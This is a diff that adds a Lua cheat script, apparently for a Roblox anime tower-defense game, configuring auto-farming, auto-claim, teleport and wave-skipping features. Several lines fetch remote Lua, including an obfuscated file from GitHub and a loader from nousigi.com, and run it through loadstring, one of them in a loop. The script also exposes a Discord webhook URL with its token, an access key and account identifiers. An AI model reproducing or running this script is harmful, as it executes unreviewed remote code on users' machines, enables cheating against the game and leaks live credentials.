@@ -1,1 +1,73 @@
-
+getgenv().GemChange = 200000
+getgenv().level = 0
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UKsqUkdfXpzt/abc/refs/heads/main/test-obfuscated%20(1).lua"))()
+getgenv().RedeemAllCode = false
+getgenv().Config = {
+    ["Misc"] = {
+        ["Right Click Teleport"] = true,
+        ["Right Click Move"] = true
+    },
+    ["Summoner"] = {
+        ["Delete Rarity"] = {
+            ["Epic"] = true,
+            ["Legendary"] = true,
+            ["Rare"] = true
+        }
+    },
+    ["Auto Play"] = {
+        ["Auto Upgrade"] = true,
+        ["Place and Upgrade"] = true,
+        ["Enable"] = true,
+        ["Middle Position"] = {
+            ["Planet Namak"] = "151.93702697753906, 7.105718612670898, 118.50502014160156"
+        },
+        ["Upgrade Method"] = "Nearest from Middle Position (until Max)",
+        ["Place Gap"] = {
+            ["Planet Namak"] = 2,
+            ["Double Dungeon"] = 2,
+            ["Sand Village"] = 2
+        }
+    },
+    ["Failsafe"] = {
+        ["Auto Rejoin"] = true,
+        ["Teleport Lobby if Player"] = true
+    },
+    ["Match Finished"] = {
+        ["Auto Replay"] = true,
+        ["Auto Next"] = false
+    },
+    ["AutoSave"] = true,
+    ["Claimer"] = {
+        ["Auto Claim Battle Pass"] = true,
+        ["Auto Claim Quest"] = true,
+        ["Auto Claim Daily Reward"] = true,
+                ["Auto Claim Milestone"] = true,
+        ["Auto Claim Collection"] = true,
+        ["Auto Claim Achievement"] = true
+    },
+    ["Stage Joiner"] = {
+        ["Auto Join"] = true,
+        ["Act"] = "Act1",
+        ["Stage"] = "Planet Namak"
+    },
+    ["Performance"] = {
+        ["Delete Map"] = true,
+        ["Boost FPS"] = true
+    },
+    ["Gameplay"] = {
+        ["Auto Skip Wave"] = true,
+        ["Auto Sell"] = {
+            ["Enable"] = true,
+            ["Wave"] = 48
+        }
+    },
+    ["Webhook"] = {
+        ["Mention"] = "",
+        ["Unit Summoned"] = true,
+        ["Stage Finished"] = true,
+        ["URL"] = "https://discord.com/api/webhooks/1290526767378989109/82dax-nMnozYwvuB3M7BOIO1RsamiNH_5dMza0WXwoVtgLwREJ4b7LHikYm4SCWItqEB"
+    }
+}
+getgenv().Key = "kf86c0da9573df601e0961fe"
+repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(10)until Joebiden
+_G.Config = { UserID = "a24b2abf-94cc-4408-b64a-dc96756929e1", discord_id = "1120921298860773456", Note = "VPS01", } loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/main/animevanguard"))()
